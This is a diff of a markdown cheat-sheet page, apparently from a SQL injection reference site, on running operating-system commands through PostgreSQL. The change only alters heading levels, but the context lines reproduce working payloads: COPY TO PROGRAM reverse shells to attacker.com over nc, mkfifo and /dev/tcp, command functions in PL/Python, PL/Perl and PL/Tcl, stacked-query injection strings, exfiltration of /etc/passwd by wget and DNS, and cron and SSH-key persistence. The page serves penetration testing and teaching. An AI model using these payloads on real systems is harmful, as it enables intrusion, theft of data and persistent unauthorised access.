@@ -7,11 +7,9 @@ tags: ["command execution", "rce", "copy program"]
 lastUpdated: 2025-12-16
 ---
 
-## Command Execution
-
 PostgreSQL provides several methods to execute operating system commands, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### COPY TO/FROM PROGRAM
+## COPY TO/FROM PROGRAM
 
 The most common method (PostgreSQL 9.3+, requires superuser):
 
@@ -26,7 +24,7 @@ DROP TABLE cmd_output;
 COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
 ```
 
-### Reverse Shell Examples
+## Reverse Shell Examples
 
 ```sql
 -- Bash reverse shell
@@ -42,9 +40,9 @@ COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash attacker.com 4444';
 COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f';
 ```
 
-### Using Extensions
+## Using Extensions
 
-#### Creating Custom Functions (C Language)
+### Creating Custom Functions (C Language)
 
 If you can load extensions:
 
@@ -75,7 +73,7 @@ SELECT system('id');
 
 **Note:** This technique requires superuser privileges (a restriction in place since PostgreSQL's earliest versions, as C is an untrusted language). Additionally, managed cloud services (AWS RDS, Azure, GCP Cloud SQL) typically don't grant superuser access, and OS-level mechanisms like SELinux or AppArmor may block loading arbitrary shared libraries.
 
-#### Using PL/Python
+### Using PL/Python
 
 If `plpython3u` extension is installed:
 
@@ -95,7 +93,7 @@ SELECT cmd('whoami');
 SELECT cmd('cat /etc/passwd');
 ```
 
-#### Using PL/Perl
+### Using PL/Perl
 
 If `plperlu` extension is installed:
 
@@ -113,7 +111,7 @@ $$ LANGUAGE plperlu;
 SELECT cmd('id');
 ```
 
-#### Using PL/Tcl
+### Using PL/Tcl
 
 ```sql
 -- Create extension
@@ -128,7 +126,7 @@ $$ LANGUAGE pltclu;
 SELECT cmd('id');
 ```
 
-### File Descriptor Hijacking
+## File Descriptor Hijacking
 
 Using `/dev/tcp` (on systems that support it):
 
@@ -138,7 +136,7 @@ Using `/dev/tcp` (on systems that support it):
 COPY (SELECT '') TO PROGRAM 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done';
 ```
 
-### Injection Examples (Simplified/Educational)
+## Injection Examples (Simplified/Educational)
 
 **⚠️ Disclaimer:** The following payloads are simplified educational examples that assume ideal conditions: no WAF, exact quote/comment context matching the injection point, stacked queries enabled, and no prepared statements. Real-world exploitation requires understanding the specific injection context (string vs numeric, single vs double quotes, comment syntax). See [Testing for Injection](/postgresql/testing-injection) for identifying the injection context.
 
@@ -156,7 +154,7 @@ COPY (SELECT '') TO PROGRAM 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while
 '; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'--
 ```
 
-### Data Exfiltration via Command Execution
+## Data Exfiltration via Command Execution
 
 ```sql
 -- Send data over HTTP
@@ -169,7 +167,7 @@ COPY (SELECT '') TO PROGRAM 'for line in $(cat /etc/passwd); do nslookup $line.a
 COPY (SELECT '') TO PROGRAM 'wget --post-data="$(cat /etc/passwd)" http://attacker.com/collect';
 ```
 
-### Persistence (Limited Practicality)
+## Persistence (Limited Practicality)
 
 **⚠️ Warning:** The following techniques require elevated OS privileges beyond what the `postgres` user typically has. Writing to `/etc/cron.d/` requires root; writing to `~/.ssh/authorized_keys` requires access to the target user's home directory. These examples are largely aspirational and only work in misconfigured environments or after additional privilege escalation.
 
@@ -183,7 +181,7 @@ COPY (SELECT '') TO PROGRAM 'echo "* * * * * root /bin/bash -c \"bash -i >& /dev
 COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO PROGRAM 'tee -a ~/.ssh/authorized_keys';
 ```
 
-### Checking Available Methods
+## Checking Available Methods
 
 ```sql
 -- Check for untrusted language extensions
@@ -196,7 +194,7 @@ SELECT version();
 SELECT current_setting('is_superuser');
 ```
 
-### Notes
+## Notes
 
 - COPY PROGRAM requires superuser privileges
 - Commands execute as the `postgres` OS user
